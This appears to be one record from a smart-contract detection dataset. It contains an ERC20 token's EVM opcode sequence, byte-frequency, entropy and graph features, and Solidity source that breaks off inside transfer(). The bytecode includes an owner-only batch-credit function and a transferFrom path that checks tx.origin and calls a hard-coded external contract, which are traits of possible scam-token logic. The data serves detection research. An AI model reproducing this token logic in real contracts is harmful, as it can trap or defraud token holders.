{
  "opcode_sequence": "PUSH1 PUSH1 MSTORE PUSH1 CALLDATASIZE LT PUSH2 JUMPI PUSH1 CALLDATALOAD PUSH1 SHR DUP1 PUSH4 GT PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI PUSH2 JUMP JUMPDEST DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI DUP1 PUSH4 EQ PUSH2 JUMPI JUMPDEST PUSH1 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP1 PUSH1 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 AND DUP1 ISZERO PUSH2 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 DUP4 PUSH1 SUB PUSH2 EXP SUB NOT AND DUP2 MSTORE PUSH1 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP1 PUSH1 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 DUP2 ADD SWAP1 POP PUSH2 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 AND DUP1 ISZERO PUSH2 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 DUP4 PUSH1 SUB PUSH2 EXP SUB NOT AND DUP2 MSTORE PUSH1 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP1 PUSH5 DUP2 GT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP3 ADD DUP4 PUSH1 DUP3 ADD GT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP2 DUP5 PUSH1 DUP4 MUL DUP5 ADD GT PUSH5 DUP4 GT OR ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST SWAP2 SWAP1 DUP1 DUP1 PUSH1 MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP4 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP4 DUP4 PUSH1 MUL DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 DUP2 DUP5 ADD MSTORE PUSH1 NOT PUSH1 DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP POP POP POP POP SWAP2 SWAP3 SWAP2 SWAP3 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP PUSH2 PUSH1 DUP1 CALLDATASIZE SUB PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 AND SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 JUMP JUMPDEST PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 DUP1 SLOAD PUSH1 DUP2 PUSH1 AND ISZERO PUSH2 MUL SUB AND PUSH1 SWAP1 DIV DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH1 DUP2 PUSH1 AND ISZERO PUSH2 MUL SUB AND PUSH1 SWAP1 DIV DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 DUP2 PUSH1 PUSH1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP6 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP3 PUSH20 AND CALLER PUSH20 AND PUSH32 DUP5 PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 SLOAD DUP2 JUMP JUMPDEST PUSH1 DUP1 DUP3 EQ ISZERO PUSH2 JUMPI PUSH1 SWAP1 POP PUSH2 JUMP JUMPDEST DUP4 PUSH20 AND CALLER PUSH20 AND EQ ISZERO DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 ORIGIN PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD EQ JUMPDEST ISZERO PUSH2 JUMPI DUP2 PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 PUSH1 PUSH1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH1 DUP1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 PUSH1 DUP1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 PUSH2 DUP6 DUP6 DUP6 PUSH2 JUMP JUMPDEST SWAP1 POP DUP1 DUP4 SUB PUSH1 DUP1 DUP7 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP4 PUSH20 AND DUP6 PUSH20 AND PUSH32 DUP6 PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 SWAP2 POP POP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 DUP2 JUMP JUMPDEST PUSH1 PUSH1 MSTORE DUP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 PUSH1 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 PUSH1 MSTORE DUP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 PUSH1 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 DUP1 SLOAD PUSH1 DUP2 PUSH1 AND ISZERO PUSH2 MUL SUB AND PUSH1 SWAP1 DIV DUP1 PUSH1 ADD PUSH1 DUP1 SWAP2 DIV MUL PUSH1 ADD PUSH1 MLOAD SWAP1 DUP2 ADD PUSH1 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 ADD DUP3 DUP1 SLOAD PUSH1 DUP2 PUSH1 AND ISZERO PUSH2 MUL SUB AND PUSH1 SWAP1 DIV DUP1 ISZERO PUSH2 JUMPI DUP1 PUSH1 LT PUSH2 JUMPI PUSH2 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 ADD SWAP2 PUSH2 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 ADD SWAP1 PUSH1 ADD DUP1 DUP4 GT PUSH2 JUMPI DUP3 SWAP1 SUB PUSH1 AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 PUSH2 CALLER DUP5 DUP5 PUSH2 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND CALLER PUSH20 AND EQ PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST PUSH1 DUP4 MLOAD DUP4 MUL SWAP1 POP DUP1 PUSH1 DUP1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP1 PUSH1 DUP1 CALLER PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 DUP1 SWAP1 POP JUMPDEST DUP5 MLOAD DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 JUMPI UNKNOWN_0xfe JUMPDEST PUSH1 MUL PUSH1 ADD ADD MLOAD SWAP1 POP DUP5 PUSH1 DUP1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 PUSH1 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 DUP1 PUSH1 DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 DUP2 SWAP1 SSTORE POP DUP1 PUSH20 AND CALLER PUSH20 AND PUSH32 PUSH1 DUP9 DUP2 PUSH2 JUMPI UNKNOWN_0xfe JUMPDEST DIV PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH20 AND CALLER PUSH20 AND PUSH32 PUSH1 DUP9 DUP2 PUSH2 JUMPI UNKNOWN_0xfe JUMPDEST DIV PUSH1 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 ADD SWAP2 POP POP PUSH1 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP DUP1 DUP1 PUSH1 ADD SWAP2 POP POP PUSH2 JUMP JUMPDEST POP PUSH1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 PUSH1 MSTORE DUP2 PUSH1 MSTORE PUSH1 PUSH1 SHA3 PUSH1 MSTORE DUP1 PUSH1 MSTORE PUSH1 PUSH1 SHA3 PUSH1 SWAP2 POP SWAP2 POP POP SLOAD DUP2 JUMP JUMPDEST PUSH1 DUP1 PUSH1 SWAP1 POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP5 PUSH20 AND EQ DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND PUSH20 AND DUP6 PUSH20 AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 JUMPI POP PUSH1 PUSH1 PUSH1 DUP8 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD SWAP1 DUP2 MSTORE PUSH1 ADD PUSH1 SHA3 SLOAD EQ JUMPDEST ISZERO PUSH2 JUMPI PUSH20 PUSH20 AND PUSH4 ADDRESS PUSH1 PUSH1 SWAP1 SLOAD SWAP1 PUSH2 EXP SWAP1 DIV PUSH20 AND DUP7 PUSH1 MLOAD DUP5 PUSH4 AND PUSH1 SHL DUP2 MSTORE PUSH1 ADD DUP1 DUP5 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD DUP4 PUSH20 AND PUSH20 AND DUP2 MSTORE PUSH1 ADD DUP3 DUP2 MSTORE PUSH1 ADD SWAP4 POP POP POP POP PUSH1 PUSH1 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 JUMPI RETURNDATASIZE PUSH1 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 REVERT JUMPDEST POP POP POP POP PUSH1 MLOAD RETURNDATASIZE PUSH1 DUP2 LT ISZERO PUSH2 JUMPI PUSH1 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP JUMPDEST DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP UNKNOWN_0xfe LOG2 PUSH6 SHA3 UNKNOWN_0xee PUSH25 PUSH4 PUSH5 STOP SDIV GT STOP ORIGIN",
  "opcode_entropy": 4.712380341299917,
  "opcode_count": 2162,
  "unique_opcodes": 64,
  "byte_entropy": 4.785695065127058,
  "byte_0x": 0.00023866348448687351,
  "byte_60": 0.07422434367541766,
  "byte_80": 0.040811455847255367,
  "byte_40": 0.011694510739856803,
  "byte_52": 0.0198090692124105,
  "byte_04": 0.007398568019093079,
  "byte_36": 0.0019093078758949881,
  "byte_10": 0.00477326968973747,
  "byte_61": 0.0243436754176611,
  "byte_00": 0.031026252983293555,
  "byte_9c": 0.0007159904534606205,
  "byte_57": 0.013842482100238664,
  "byte_35": 0.004057279236276849,
  "byte_e0": 0.00047732696897374703,
  "byte_1c": 0.00023866348448687351,
  "byte_63": 0.004534606205250597,
  "byte_31": 0.001431980906921241,
  "byte_e6": 0.00047732696897374703,
  "byte_58": 0.0009546539379474941,
  "byte_a5": 0.00047732696897374703,
  "byte_11": 0.0019093078758949881,
  "byte_64": 0.0009546539379474941,
  "byte_14": 0.004534606205250597,
  "byte_02": 0.008353221957040573,
  "byte_73": 0.015990453460620526,
  "byte_70": 0.00023866348448687351,
  "byte_a0": 0.00023866348448687351,
  "byte_82": 0.011455847255369928,
  "byte_d8": 0.0007159904534606205,
  "byte_95": 0.0009546539379474941,
  "byte_9b": 0.0009546539379474941,
  "byte_41": 0.0007159904534606205,
  "byte_03": 0.012649164677804296,
  "byte_3d": 0.0009546539379474941,
  "byte_a9": 0.00023866348448687351,
  "byte_05": 0.002386634844868735,
  "byte_bb": 0.00047732696897374703,
  "byte_cd": 0.00023866348448687351,
  "byte_aa": 0.0009546539379474941,
  "byte_2f": 0.00023866348448687351,
  "byte_20": 0.029832935560859187,
  "byte_33": 0.002863961813842482,
  "byte_dd": 0.0016706443914081145,
  "byte_62": 0.00047732696897374703,
  "byte_ed": 0.00023866348448687351,
  "byte_3e": 0.0007159904534606205,
  "byte_0d": 0.0019093078758949881,
  "byte_56": 0.0076372315035799524,
  "byte_5b": 0.021241050119331743,
  "byte_06": 0.0016706443914081145,
  "byte_fd": 0.006443914081145584,
  "byte_de": 0.00023866348448687351,
  "byte_a1": 0.0009546539379474941,
  "byte_09": 0.0009546539379474941,
  "byte_5e": 0.00023866348448687351,
  "byte_a7": 0.0009546539379474941,
  "byte_b3": 0.0011933174224343676,
  "byte_01": 0.03866348448687351,
  "byte_18": 0.00023866348448687351,
  "byte_16": 0.0198090692124105,
  "byte_97": 0.00047732696897374703,
  "byte_23": 0.0011933174224343676,
  "byte_b8": 0.00023866348448687351,
  "byte_72": 0.00047732696897374703,
  "byte_c2": 0.0011933174224343676,
  "byte_3c": 0.00023866348448687351,
  "byte_e5": 0.00047732696897374703,
  "byte_67": 0.00023866348448687351,
  "byte_48": 0.00023866348448687351,
  "byte_34": 0.0016706443914081145,
  "byte_15": 0.014558472553699284,
  "byte_ad": 0.0009546539379474941,
  "byte_50": 0.039618138424821,
  "byte_b6": 0.00047732696897374703,
  "byte_92": 0.007875894988066826,
  "byte_51": 0.011694510739856803,
  "byte_81": 0.03007159904534606,
  "byte_83": 0.007398568019093079,
  "byte_91": 0.017422434367541765,
  "byte_90": 0.034606205250596656,
  "byte_f6": 0.00023866348448687351,
  "byte_84": 0.003579952267303103,
  "byte_db": 0.00047732696897374703,
  "byte_1f": 0.002386634844868735,
  "byte_0a": 0.003341288782816229,
  "byte_19": 0.0011933174224343676,
  "byte_f3": 0.003579952267303103,
  "byte_7d": 0.0007159904534606205,
  "byte_47": 0.00023866348448687351,
  "byte_ff": 0.301909307875895,
  "byte_30": 0.0007159904534606205,
  "byte_a3": 0.001431980906921241,
  "byte_ac": 0.00023866348448687351,
  "byte_07": 0.0019093078758949881,
  "byte_22": 0.00023866348448687351,
  "byte_2e": 0.00047732696897374703,
  "byte_28": 0.0019093078758949881,
  "byte_54": 0.006443914081145584,
  "byte_5d": 0.00047732696897374703,
  "byte_7f": 0.0011933174224343676,
  "byte_96": 0.00023866348448687351,
  "byte_3a": 0.00023866348448687351,
  "byte_e4": 0.00023866348448687351,
  "byte_27": 0.00023866348448687351,
  "byte_fb": 0.00023866348448687351,
  "byte_49": 0.00047732696897374703,
  "byte_6a": 0.00047732696897374703,
  "byte_77": 0.00023866348448687351,
  "byte_bf": 0.00047732696897374703,
  "byte_e3": 0.0007159904534606205,
  "byte_0b": 0.0019093078758949881,
  "byte_08": 0.0007159904534606205,
  "byte_66": 0.00023866348448687351,
  "byte_78": 0.00047732696897374703,
  "byte_17": 0.00023866348448687351,
  "byte_9a": 0.00023866348448687351,
  "byte_93": 0.0009546539379474941,
  "byte_37": 0.0009546539379474941,
  "byte_1d": 0.0007159904534606205,
  "byte_7c": 0.00023866348448687351,
  "byte_c7": 0.00047732696897374703,
  "byte_85": 0.0021479713603818618,
  "byte_55": 0.0016706443914081145,
  "byte_8c": 0.00023866348448687351,
  "byte_e1": 0.00023866348448687351,
  "byte_eb": 0.00047732696897374703,
  "byte_ec": 0.00047732696897374703,
  "byte_d1": 0.00023866348448687351,
  "byte_4f": 0.00023866348448687351,
  "byte_71": 0.00047732696897374703,
  "byte_42": 0.00023866348448687351,
  "byte_1e": 0.0009546539379474941,
  "byte_c0": 0.00047732696897374703,
  "byte_f7": 0.00023866348448687351,
  "byte_b2": 0.00047732696897374703,
  "byte_29": 0.00023866348448687351,
  "byte_c8": 0.0011933174224343676,
  "byte_c3": 0.00023866348448687351,
  "byte_b9": 0.00047732696897374703,
  "byte_25": 0.0009546539379474941,
  "byte_3b": 0.00047732696897374703,
  "byte_32": 0.00047732696897374703,
  "byte_cf": 0.00023866348448687351,
  "byte_86": 0.001431980906921241,
  "byte_44": 0.00023866348448687351,
  "byte_1a": 0.00023866348448687351,
  "byte_f2": 0.0007159904534606205,
  "byte_1b": 0.0009546539379474941,
  "byte_e2": 0.0009546539379474941,
  "byte_69": 0.0007159904534606205,
  "byte_b0": 0.0007159904534606205,
  "byte_68": 0.0007159904534606205,
  "byte_fc": 0.0007159904534606205,
  "byte_8d": 0.0007159904534606205,
  "byte_2b": 0.0007159904534606205,
  "byte_f1": 0.0011933174224343676,
  "byte_c4": 0.0007159904534606205,
  "byte_f5": 0.001431980906921241,
  "byte_5a": 0.0009546539379474941,
  "byte_4d": 0.0007159904534606205,
  "byte_ef": 0.0007159904534606205,
  "byte_12": 0.00023866348448687351,
  "byte_d5": 0.00023866348448687351,
  "byte_79": 0.00047732696897374703,
  "byte_cc": 0.00023866348448687351,
  "byte_0c": 0.00047732696897374703,
  "byte_fe": 0.0009546539379474941,
  "byte_88": 0.00047732696897374703,
  "byte_0e": 0.0007159904534606205,
  "byte_9e": 0.00047732696897374703,
  "byte_e9": 0.00023866348448687351,
  "byte_87": 0.00047732696897374703,
  "byte_ce": 0.00023866348448687351,
  "byte_c5": 0.00023866348448687351,
  "byte_b4": 0.00023866348448687351,
  "byte_4a": 0.00023866348448687351,
  "byte_2a": 0.00023866348448687351,
  "byte_53": 0.00023866348448687351,
  "byte_0f": 0.0007159904534606205,
  "byte_df": 0.00023866348448687351,
  "byte_a2": 0.00023866348448687351,
  "byte_65": 0.00023866348448687351,
  "byte_7a": 0.00047732696897374703,
  "byte_ee": 0.00023866348448687351,
  "byte_39": 0.00023866348448687351,
  "byte_ae": 0.00023866348448687351,
  "byte_38": 0.00023866348448687351,
  "byte_cb": 0.00023866348448687351,
  "byte_7e": 0.00047732696897374703,
  "byte_ba": 0.00047732696897374703,
  "byte_ea": 0.00023866348448687351,
  "byte_6f": 0.00023866348448687351,
  "byte_6c": 0.00023866348448687351,
  "byte_43": 0.00023866348448687351,
  "num_nodes": 148,
  "num_edges": 134,
  "avg_degree": 1.8108108108108107,
  "density": 0.0061592204449347305,
  "connected_components": 29,
  "avg_clustering": 0.02927927927927928,
  "timeline_sequence": [],
  "sourcecode": "pragma solidity ^0.5.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns(uint);\n\n    function balanceOf(address account) external view returns(uint);\n\n    function transfer(address recipient, uint amount) external returns(bool);\n\n    function allowance(address owner, address spender) external view returns(uint);\n\n    function approve(address spender, uint amount) external returns(bool);\n\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Context {\n    constructor() internal {}\n    function _msgSender() internal view returns(address payable) {\n        return msg.sender;\n    }\n}\n\ncontract ERC20 is Context, IERC20 {\n    using SafeMath for uint;\n    mapping(address => uint) private _balances;\n\n    mapping(address => mapping(address => uint)) private _allowances;\n\n    uint private _totalSupply;\n\n    function totalSupply() public view returns(uint) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns(uint) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint amount) public returns(bool) 